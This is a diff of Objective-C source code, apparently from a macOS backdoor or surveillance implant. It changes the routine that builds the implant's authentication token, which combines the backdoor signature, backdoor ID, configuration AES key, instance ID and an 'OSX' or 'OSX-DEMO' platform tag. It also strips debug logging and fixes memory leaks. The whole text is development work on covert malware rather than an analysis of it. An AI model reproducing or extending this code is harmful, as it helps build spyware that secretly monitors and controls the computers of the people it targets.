@@ -26,17 +26,10 @@
 {
   if (self = [super init])
     {
-      // Temp Code
-      unsigned char signature[CC_MD5_DIGEST_LENGTH];
-      CC_MD5(gBackdoorSignature, strlen(gBackdoorSignature), signature);
-      
-      mBackdoorSignature = [[NSData alloc] initWithBytes: &signature
+      mBackdoorSignature = [[NSData alloc] initWithBytes: gBackdoorSignature
                                                   length: CC_MD5_DIGEST_LENGTH];
       mTransport = aTransport;
       
-#ifdef DEBUG_AUTH_NOP
-      infoLog(@"mTransport: %@", mTransport);
-#endif
       return self;
     }
   
@@ -53,10 +46,6 @@
 
 - (BOOL)perform
 {
-#ifdef DEBUG_AUTH_NOP
-  infoLog(@"");
-#endif
-  
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   
   u_int randomNumber, i;
@@ -86,17 +75,6 @@
                   length: sizeof(randomNumber)];
     }
   
-#ifdef DEV_MODE
-  unsigned char confkey[CC_MD5_DIGEST_LENGTH];
-  unsigned char instance[CC_SHA1_DIGEST_LENGTH];
-  CC_MD5(gConfAesKey, strlen(gConfAesKey), confkey);
-  CC_SHA1(gInstanceId, strlen(gInstanceId), instance);
-  
-  NSData *confKey = [NSData dataWithBytes: &confkey
-                                   length: CC_MD5_DIGEST_LENGTH];
-  NSData *instanceID = [NSData dataWithBytes: &instance
-                                      length: CC_SHA1_DIGEST_LENGTH];
-#else
   NSData *confKey = [NSData dataWithBytes: &gConfAesKey
                                    length: CC_MD5_DIGEST_LENGTH];
   
@@ -111,19 +89,31 @@
   
   NSData *instanceID = [_instanceID sha1Hash];
   [_instanceID release];
-#endif
   
+  //XXX- check for the null terminator
   NSMutableData *backdoorID = [[NSMutableData alloc] init];
+
   [backdoorID appendBytes: &gBackdoorID
                    length: strlen(gBackdoorID)];
+  
   [backdoorID appendBytes: &nullTerminator
                    length: sizeof(char)];
   [backdoorID appendBytes: &nullTerminator
                    length: sizeof(char)];
   
-  NSMutableData *type = [[NSMutableData alloc] initWithData:
-                         [@"MACOS" dataUsingEncoding: NSASCIIStringEncoding]];
-  for (i = 0; i < 11; i++)
+  NSMutableData *type;
+  
+  // FIXED-
+  if (gIsDemoMode)
+    type = [[NSMutableData alloc] initWithData:
+            [@"OSX-DEMO" dataUsingEncoding: NSASCIIStringEncoding]];
+  else
+    type = [[NSMutableData alloc] initWithData:
+                           [@"OSX" dataUsingEncoding: NSASCIIStringEncoding]];
+                         
+  int typeLen = 16 - [type length];
+  
+  for (i = 0; i < typeLen; i++)
     {
       [type appendBytes: &nullTerminator
                  length: sizeof(char)];
@@ -147,6 +137,7 @@
   infoLog(@"confkey     : %@", confKey);
   infoLog(@"idToken: %@", idToken);
 #endif
+
   NSData *shaIDToken = [idToken sha1Hash];
   
 #ifdef DEBUG_AUTH_NOP
@@ -285,6 +276,10 @@
   
   [kd release];
   [nOnce release];
+  // FIXED-
+  [backdoorID release];
+  [type release];
+  //
   [idToken release];
   [message release];
   [encMessage release];
